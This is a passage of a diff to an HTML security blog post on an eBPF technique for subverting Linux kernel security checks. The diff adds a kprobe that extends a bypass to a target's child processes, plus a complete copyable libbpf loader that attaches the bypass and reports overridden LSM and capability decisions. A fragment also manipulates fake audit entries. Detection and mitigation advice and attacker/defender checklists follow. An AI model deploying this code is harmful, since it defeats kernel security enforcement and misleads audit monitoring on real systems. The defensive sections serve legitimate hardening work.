+            <span class="c1">// to carefully craft fake log entries.</span>
+            <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">audit_id</span><span class="p">);</span>
+        <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Add child processes of our target to our tracking map</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/wake_up_new_task"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_new_task</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// FIX: Correctly get parent PID from the task_struct</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">parent</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">parent_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">u32</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">child_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                 <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+                 <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="user-space-control-program">User-Space Control Program</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the eBPF security bypass</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"mirror_controls.skel.h"</span><span class="c1"> // This header is auto-generated by bpftool</span><span class="cp">
+</span>
+<span class="c1">// This structure must match the one in the eBPF C code</span>
+<span class="k">struct</span> <span class="n">security_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">security_ptr</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">security_result</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">modified_result</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="n">u32</span> <span class="n">audit_id</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+<span class="c1">// Callback function to handle events received from the kernel</span>
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">security_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[</span><span class="se">\033</span><span class="s">[0;31mBYPASS</span><span class="se">\033</span><span class="s">[0m] PID %d (%s) - Original Result: %d, Modified: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+           <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">security_result</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">modified_result</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  LSM Bypass on file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  Capability Check Bypass</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">mirror_controls_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="c1">// Set up signal handler for graceful shutdown</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// libbpf-based programs need to increase the memory lock resource limit</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to increase RLIMIT_MEMLOCK limit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Open, load, and verify BPF application</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">mirror_controls_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach tracepoints, kprobes, and other BPF programs to their hooks</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">mirror_controls_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">err</span><span class="p">));</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer to receive events from the kernel</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">8</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">errno</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">err</span><span class="p">));</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Mirror Controls eBPF program successfully loaded and attached!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Bypassing security controls for PID %d and its children...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">TARGET_PID</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop: poll for events from the kernel</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span> <span class="cm">/* timeout, ms */</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">err</span><span class="p">));</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="c1">// Reset err for the next poll</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">mirror_controls_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
 <h3 id="detection-methods">Detection Methods</h3>
 
-<p>Defenders should monitor for:</p>
-<ul>
-  <li>Unexpected eBPF programs attached to security-related functions</li>
-  <li>Discrepancies between security policy and actual system behavior</li>
-  <li>Unusual patterns of eBPF program loading</li>
-  <li>Inconsistencies between different security monitoring systems</li>
-  <li>Processes that appear to function despite security restrictions</li>
-</ul>
+<p>Defenders should implement multiple layers of detection:</p>
+
+<ol>
+  <li><strong>eBPF Program Monitoring</strong>:
+    <ul>
+      <li>Monitor for unexpected eBPF programs attached to security-related functions</li>
+      <li>Track eBPF program loading patterns and verify signatures</li>
+      <li>Use tools like <code class="language-plaintext highlighter-rouge">bpftool</code> to list and inspect loaded programs</li>
+    </ul>
+  </li>
+  <li><strong>Behavioral Analysis</strong>:
+    <ul>
+      <li>Look for discrepancies between security policy and actual system behavior</li>
+      <li>Implement out-of-band monitoring that doesn’t rely on kernel audit mechanisms</li>
+      <li>Use statistical analysis to detect anomalies in security enforcement patterns</li>
+    </ul>
+  </li>
+  <li><strong>Integrity Verification</strong>:
+    <ul>
+      <li>Implement kernel integrity monitoring</li>
+      <li>Use secure boot and measured boot to verify kernel integrity</li>
+      <li>Deploy runtime integrity checking for critical security subsystems</li>
+    </ul>
+  </li>
+  <li><strong>Cross-Validation</strong>:
+    <ul>
+      <li>Deploy multiple independent security monitoring systems</li>
+      <li>Compare results from different monitoring approaches</li>
+      <li>Look for inconsistencies that might indicate tampering</li>
+    </ul>
+  </li>
+  <li><strong>Specific Indicators</strong>:
+    <ul>
+      <li>Processes that appear to function despite security restrictions</li>
+      <li>Mismatches between audit logs and observed behavior</li>
+      <li>Unusual patterns in security-related syscalls</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF from container</span>
+podman run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># Restrict BPF syscall with seccomp</span>
+seccomp-bpf-filter.json:
+<span class="o">{</span>
+  <span class="s2">"defaultAction"</span>: <span class="s2">"SCMP_ACT_ALLOW"</span>,
+  <span class="s2">"syscalls"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"name"</span>: <span class="s2">"bpf"</span>,
+      <span class="s2">"action"</span>: <span class="s2">"SCMP_ACT_ERRNO"</span>
+    <span class="o">}</span>
+  <span class="o">]</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement BPF LSM Policies</strong>:
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">// Example BPF LSM policy to restrict BPF program loading</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"lsm/bpf"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">restrict_bpf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Only allow specific signing keys or programs from trusted paths</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_get_current_uid_gid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Use eBPF-Based Security Tools</strong>:
+    <ul>
+      <li>Deploy tools like Falco, Tracee, or Tetragon that can detect malicious eBPF usage</li>
+      <li>Implement custom eBPF programs that monitor for security bypasses</li>
+    </ul>
+  </li>
+</ol>
 
 <p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security controls, especially in environments where multiple layers of security are expected to provide defense-in-depth.</p>
+
+<p><strong>Attacker hat on</strong></p>
+
+<ol>
+  <li>Identify a target system with eBPF capabilities and security controls</li>
+  <li>Map the kernel functions responsible for security enforcement</li>
+  <li>Develop eBPF programs that hook into these enforcement points</li>
+  <li>Load the malicious BPF programs with appropriate privileges</li>
+  <li>Modify security decisions to allow otherwise prohibited operations</li>
+  <li>Ensure audit logs show the expected “denied” messages while operations succeed</li>
+  <li>Maintain persistence through the eBPF programs</li>
+</ol>
+
+<p><strong>Defender hat on</strong></p>
+
+<ol>
+  <li>Remove CAP_BPF from untrusted processes and containers</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Monitor for unexpected eBPF programs attached to security functions</li>
+  <li>Use multiple, independent security monitoring mechanisms</li>
+  <li>Implement integrity verification for security subsystems</li>
+  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
+</ol>
+
+<p><strong>Conclusion</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to intercept and modify kernel security decisions through eBPF creates a particularly dangerous scenario where attacks succeed while all monitoring systems report compliance. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls.</p>
 
                     </div>
                 </article>
